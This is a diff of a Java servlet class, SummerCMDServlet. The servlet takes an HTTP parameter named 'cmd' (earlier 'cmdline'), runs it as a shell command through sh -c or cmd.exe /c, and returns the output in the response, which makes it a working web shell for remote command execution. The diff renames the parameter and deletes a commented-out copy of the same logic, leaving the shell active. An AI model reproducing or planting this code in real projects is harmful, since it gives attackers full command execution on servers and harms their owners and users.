@@ -2,7 +2,6 @@ package com.summer233;
 
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.PrintWriter;
 import java.util.Scanner;
 
 import javax.servlet.Servlet;
@@ -32,15 +31,15 @@ public class SummerCMDServlet implements Servlet {
       servletResponse.setCharacterEncoding("UTF-8");
       servletResponse.getWriter().println("this is a SummerCMDServlet<br>");
       HttpServletRequest req = (HttpServletRequest) servletRequest;
-      String cmdline = req.getParameter("cmdline");
-      if (cmdline != null) {
+      String cmd = req.getParameter("cmd");
+      if (cmd != null) {
          boolean isLinux = true;
          String osTyp = System.getProperty("os.name");
          if (osTyp != null && osTyp.toLowerCase().contains("win")) {
             isLinux = false;
          }
-         String[] cmds = isLinux ? new String[] { "sh", "-c", cmdline }
-               : new String[] { "cmd.exe", "/c", cmdline };
+         String[] cmds = isLinux ? new String[] { "sh", "-c", cmd }
+               : new String[] { "cmd.exe", "/c", cmd };
          InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
          Scanner s = new Scanner(in).useDelimiter("\\a");
          String output = s.hasNext() ? s.next() : "";
@@ -48,21 +47,6 @@ public class SummerCMDServlet implements Servlet {
          servletResponse.getWriter().flush();
          servletResponse.getWriter().close();
       }
-
-      // String cmd = servletRequest.getParameter("cmd");
-      // boolean isLinux = true;
-      // String osTyp = System.getProperty("os.name");
-      // if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-      //    isLinux = false;
-      // }
-      // String[] cmds = isLinux ? new String[] { "sh", "-c", cmd } : new String[] { "cmd.exe", "/c", cmd };
-      // InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-      // Scanner s = new Scanner(in).useDelimiter("\\a");
-      // String output = s.hasNext() ? s.next() : "";
-      // PrintWriter out = servletResponse.getWriter();
-      // out.println(output);
-      // out.flush();
-      // out.close();
    }
 
    @Override
